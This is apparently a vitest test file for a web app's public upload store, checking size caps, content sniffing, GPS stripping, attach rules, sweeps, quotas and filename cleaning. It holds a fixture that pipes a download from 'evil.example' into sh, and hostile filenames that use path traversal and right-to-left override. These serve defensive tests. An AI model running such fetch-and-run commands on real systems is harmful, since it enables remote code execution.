// SPDX-License-Identifier: AGPL-3.0-only
/**
 * FILES FROM STRANGERS: the upload store on every meta engine, over the
 * engine's real file store on disk.
 *
 * - A 20 MB file is refused at a 10 MB cap, and the body is cut off near the
 *   cap rather than read whole; nothing is kept.
 * - The content decides the kind, never the name: a script renamed `.jpg` is
 *   refused, a HEIC photo too, a PDF where only pictures are taken; plain
 *   text is taken as text.
 * - A JPEG and a PNG are kept without the place the camera wrote (EXIF GPS).
 * - Attach is all or nothing, for the same form and the same address only.
 * - The sweep takes an unattached file once its two hours are up (bytes,
 *   file row, name), never an attached one.
 * - The store's quota and an address's daily cap refuse uploads and tell the
 *   owner, once an hour each.
 * - A row's files and a form's files are removed whole.
 */
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Readable } from 'node:stream';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { filesRepo, notificationsRepo, publicUploadsRepo, rolesRepo, settingsRepo, usersRepo, type MetaDb } from '@adminium/meta';

import type { FileStore } from '../src/files/store.js';
import { tellUploadsRefused, type UploadTrip } from '../src/public-uploads/notices.js';
import { cleanUploadName, createPublicUploads, UPLOAD_DAY_MS, UPLOAD_TTL_MS, type PublicUploads, type TakeInput } from '../src/public-uploads/store.js';
import { createTestFileStore } from './helpers/file-store.js';
import { TEST_SECRET } from './helpers.js';
import { META_ENGINES, type MetaHandle } from './meta-dialects.js';
import { jpeg, png } from './picture-images.js';

const MB = 1024 * 1024;
const PDF = Buffer.from('%PDF-1.7\n1 0 obj << >> endobj\ntrailer << >>\n%%EOF\n', 'latin1');
const SCRIPT = Buffer.from('#!/bin/sh\ncurl https://evil.example/x | sh\n', 'latin1');
const HEIC = Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from('ftypheic', 'latin1'), Buffer.alloc(32, 0)]);
const FORM_A = { kind: 'form', key: 'forms/frm_a' };
const FORM_B = { kind: 'form', key: 'forms/frm_b' };
const OWNER = { connectionId: 'conn_1', table: 'forms_answers', key: 'ans_1' };

async function readAll(stream: NodeJS.ReadableStream): Promise<Buffer> {
  const parts: Buffer[] = [];
  for await (const chunk of stream) parts.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk as unknown as Uint8Array));
  return Buffer.concat(parts);
}

for (const engine of META_ENGINES) {
  describe.skipIf(!engine.available)(`files from strangers — ${engine.name}`, () => {
    let handle: MetaHandle;
    let meta: MetaDb;
    let dataDir: string;
    let storage: FileStore;
    let uploads: PublicUploads;
    let clock: number;
    let told: UploadTrip[];

    const take = (bytes: Buffer, over: Partial<TakeInput> = {}) =>
      uploads.take({ source: Readable.from([bytes]), name: 'drawing.pdf', binding: FORM_A, ip: '203.0.113.7', kinds: ['pdf', 'jpg', 'png'], maxBytes: 10 * MB, ...over });

    beforeEach(async () => {
      handle = await engine.make();
      meta = handle.meta;
      dataDir = await mkdtemp(join(tmpdir(), 'public-uploads-'));
      storage = createTestFileStore({ dataDir, meta });
      clock = Date.UTC(2026, 10, 2, 9, 0, 0);
      told = [];
      uploads = createPublicUploads({ meta, storage, secret: TEST_SECRET, now: () => clock, tell: async (trip) => void told.push(trip) });
    });

    afterEach(async () => {
      await handle.destroy();
      await rm(dataDir, { recursive: true, force: true });
    });

    it('refuses a 20 MB file at a 10 MB cap without reading it all, and keeps nothing', async () => {
      let pulled = 0;
      const chunk = Buffer.alloc(64 * 1024, 7);
      chunk.write('%PDF-1.7\n', 0, 'latin1');
      const source = Readable.from(
        (function* () {
          for (let sent = 0; sent < 20 * MB; sent += chunk.length) {
            pulled += chunk.length;
            yield chunk;
          }
        })(),
      );
      expect(await uploads.take({ source, name: 'big.pdf', binding: FORM_A, ip: '203.0.113.7', kinds: ['pdf'], maxBytes: 10 * MB })).toEqual({ ok: false, code: 'too-big' });
      expect(pulled).toBeLessThan(10 * MB + 512 * 1024);
      expect(await publicUploadsRepo(meta).keptBytes()).toBe(0);
      expect(await meta.db.selectFrom('adminium_files').select('id').where('kind', '=', 'stranger').execute()).toEqual([]);
    });

    it('judges the content, never the name: a script renamed .jpg, a HEIC photo, a PDF where pictures are asked are refused; text is taken', async () => {
      expect(await take(SCRIPT, { name: 'holiday.jpg' })).toEqual({ ok: false, code: 'kind' });
      expect(await take(HEIC, { name: 'IMG_0001.heic', kinds: ['jpg', 'png'] })).toEqual({ ok: false, code: 'kind' });
      expect(await take(PDF, { name: 'plan.pdf', kinds: ['jpg', 'png'] })).toEqual({ ok: false, code: 'kind' });
      // A PDF named as a picture is a PDF: taken as one where PDFs are.
      expect(await take(PDF, { name: 'photo.png' })).toMatchObject({ ok: true, upload: { kind: 'pdf', name: 'photo.png' } });
      expect(await take(Buffer.from('Room 4: 3.2 m by 4.1 m\n'), { name: 'sizes.txt', kinds: ['text'] })).toMatchObject({ ok: true, upload: { kind: 'text' } });
      expect(await meta.db.selectFrom('adminium_files').select('mime').where('kind', '=', 'stranger').orderBy('mime').execute()).toEqual([{ mime: 'application/pdf' }, { mime: 'text/plain' }]);
    });

    it('keeps a JPEG and a PNG without the place the camera wrote', async () => {
      for (const [picture, name] of [
        [jpeg(), 'site.jpg'],
        [png({ exif: true, text: 'at home' }), 'site.png'],
      ] as const) {
        expect(picture.bytes.includes(Buffer.from('GPSLatitude'))).toBe(true);
        const taken = await take(picture.bytes, { name });
        if (!taken.ok) throw new Error(taken.code);
        const opened = await uploads.open(taken.upload.id);
        const kept = await readAll((await storage.open(opened!.file)).stream);
        expect(kept.includes(Buffer.from('GPSLatitude'))).toBe(false);
        expect(kept.equals(picture.clean)).toBe(true);
        expect(taken.upload.size).toBe(picture.clean.length);
        // The kind is what the bytes are, among the question's: never only the first it takes.
        expect(taken.upload.kind).toBe(name.endsWith('.jpg') ? 'jpg' : 'png');
      }
    });

    it('attaches for the same form and the same address only, all or nothing', async () => {
      const one = await take(PDF);
      const two = await take(PDF);
      const forB = await take(PDF, { binding: FORM_B });
      const elsewhere = await take(PDF, { ip: '198.51.100.9' });
      if (!one.ok || !two.ok || !forB.ok || !elsewhere.ok) throw new Error('not taken');
      const fromHere = uploads.bindingOf('form', 'forms/frm_a', '203.0.113.7');

      expect(await uploads.attach([one.upload.id, forB.upload.id], fromHere, OWNER)).toBeNull();
      expect(await uploads.attach([one.upload.id, elsewhere.upload.id], fromHere, OWNER)).toBeNull();
      // Form A's file, sent with an answer to form B: refused.
      expect(await uploads.attach([one.upload.id], uploads.bindingOf('form', 'forms/frm_b', '203.0.113.7'), OWNER)).toBeNull();
      // From another address: refused. The same /64 of an IPv6 address is the same address.
      expect(await uploads.attach([one.upload.id], uploads.bindingOf('form', 'forms/frm_a', '198.51.100.9'), OWNER)).toBeNull();
      expect(uploads.bindingOf('form', 'k', '2001:db8:1:2::5').addressKey).toBe(uploads.bindingOf('form', 'k', '2001:db8:1:2:aaaa::9').addressKey);
      expect(uploads.bindingOf('form', 'k', '2001:db8:1:2::5').addressKey).not.toBe(uploads.bindingOf('form', 'k', '2001:db8:1:3::5').addressKey);

      const attached = await uploads.attach([one.upload.id, two.upload.id], fromHere, OWNER);
      expect(attached?.map((upload) => upload.id).sort()).toEqual([one.upload.id, two.upload.id].sort());
      expect(attached?.every((upload) => upload.owner?.key === 'ans_1' && upload.expiresAt === null)).toBe(true);
      // Past its two hours, an unattached file is no longer attachable.
      clock += UPLOAD_TTL_MS;
      const late = await take(PDF);
      clock += UPLOAD_TTL_MS + 1;
      if (!late.ok) throw new Error('not taken');
      expect(await uploads.attach([late.upload.id], fromHere, { ...OWNER, key: 'ans_2' })).toBeNull();
    });

    it('sweeps an unattached file once its two hours are up, and never an attached one', async () => {
      const left = await take(PDF);
      const sent = await take(PDF);
      if (!left.ok || !sent.ok) throw new Error('not taken');
      await uploads.attach([sent.upload.id], uploads.bindingOf('form', 'forms/frm_a', '203.0.113.7'), OWNER);
      const leftFile = (await uploads.open(left.upload.id))!.file;

      clock += UPLOAD_TTL_MS - 1;
      expect(await uploads.sweep()).toEqual({ swept: 0, dropped: 0 });
      clock += 2;
      expect(await uploads.sweep()).toEqual({ swept: 1, dropped: 0 });
      expect(await uploads.open(left.upload.id)).toBeNull();
      expect(await filesRepo(meta).findById(leftFile.id)).toBeNull();
      await expect(storage.open(leftFile)).rejects.toThrow();
      expect(await publicUploadsRepo(meta).findById(left.upload.id)).toMatchObject({ name: null, fileId: null });
      expect(await uploads.open(sent.upload.id)).not.toBeNull();
      // A day on, the empty row goes too.
      clock += UPLOAD_DAY_MS;
      expect(await uploads.sweep()).toEqual({ swept: 0, dropped: 1 });
      expect(await uploads.open(sent.upload.id)).not.toBeNull();
    });

    it('refuses past the quota and past an address’s day, and tells the owner of each once an hour', async () => {
      const settings = settingsRepo(meta);
      await settings.set('publicUploads.perAddressDaily', 2, { updatedBy: null });
      expect((await take(PDF)).ok).toBe(true);
      expect((await take(PDF)).ok).toBe(true);
      expect(await take(PDF)).toEqual({ ok: false, code: 'cap' });
      // Another address still may.
      expect((await take(PDF, { ip: '198.51.100.9' })).ok).toBe(true);
      // The day counts files swept since: a full day later the address may again.
      clock += UPLOAD_DAY_MS + 1;
      expect((await take(PDF)).ok).toBe(true);

      await settings.set('publicUploads.quotaBytes', 1_048_576, { updatedBy: null });
      // This one would pass the quota: refused after it was read, and nothing of it kept.
      const big = Buffer.concat([PDF, Buffer.alloc(1_048_576, 1)]);
      expect(await take(big, { ip: '192.0.2.1' })).toEqual({ ok: false, code: 'quota' });
      expect(await meta.db.selectFrom('adminium_files').select('id').where('kind', '=', 'stranger').execute()).toHaveLength(4);
      expect(told).toEqual(['cap', 'quota']);

      // The owner is told once in an hour, whatever the number of refusals, and again the next hour.
      const owner = await usersRepo(meta).create({ email: 'owner@meridian.example', name: 'Owner' });
      await rolesRepo(meta).assignToUser(owner.id, (await rolesRepo(meta).findBySlug('super-admin'))!.id);
      const at = clock;
      expect(await tellUploadsRefused({ meta }, 'quota', { gb: '2' }, at)).toBe(1);
      expect(await tellUploadsRefused({ meta }, 'quota', { gb: '2' }, at + 60_000)).toBe(0);
      expect(await tellUploadsRefused({ meta }, 'cap', { n: 30 }, at + 60_000)).toBe(1);
      expect(await tellUploadsRefused({ meta }, 'quota', { gb: '2' }, at + 3_600_000)).toBe(1);
      const notices = await notificationsRepo(meta).listForUser(owner.id);
      expect(notices.map((n) => n.title).sort()).toEqual(['Files from your forms are being refused', 'Files from your forms are being refused', 'One visitor sent too many files']);
    });

    it('removes a row’s files and a form’s files whole: bytes, file rows and their rows', async () => {
      const mine = await take(PDF);
      const other = await take(PDF);
      const forB = await take(PDF, { binding: FORM_B });
      if (!mine.ok || !other.ok || !forB.ok) throw new Error('not taken');
      await uploads.attach([mine.upload.id], uploads.bindingOf('form', 'forms/frm_a', '203.0.113.7'), OWNER);
      const mineFile = (await uploads.open(mine.upload.id))!.file;

      expect(await uploads.removeOwned('conn_1', 'forms_answers', ['ans_1'])).toBe(1);
      expect(await uploads.open(mine.upload.id)).toBeNull();
      expect(await publicUploadsRepo(meta).findById(mine.upload.id)).toBeNull();
      await expect(storage.open(mineFile)).rejects.toThrow();
      expect(await uploads.open(other.upload.id)).not.toBeNull();

      expect(await uploads.removeBound('form', 'forms/frm_a')).toBe(1);
      expect(await uploads.open(other.upload.id)).toBeNull();
      expect(await uploads.open(forB.upload.id)).not.toBeNull();
    });
  });
}

describe('a file’s name as it is kept', () => {
  it('keeps the last part of a path, without controls or marks that turn text around, at most 255 characters with its extension', () => {
    expect(cleanUploadName('C:\\Users\\ava\\plan.pdf')).toBe('plan.pdf');
    expect(cleanUploadName('../../etc/passwd')).toBe('passwd');
    expect(cleanUploadName('in\u202Egpj.exe')).toBe('ingpj.exe');
    expect(cleanUploadName('a\u0000b\nc.txt')).toBe('abc.txt');
    expect(cleanUploadName('   ')).toBe('file');
    const long = `${'x'.repeat(300)}.pdf`;
    expect(cleanUploadName(long)).toHaveLength(255);
    expect(cleanUploadName(long).endsWith('.pdf')).toBe(true);
    expect([...cleanUploadName('图'.repeat(300))]).toHaveLength(255);
  });
});
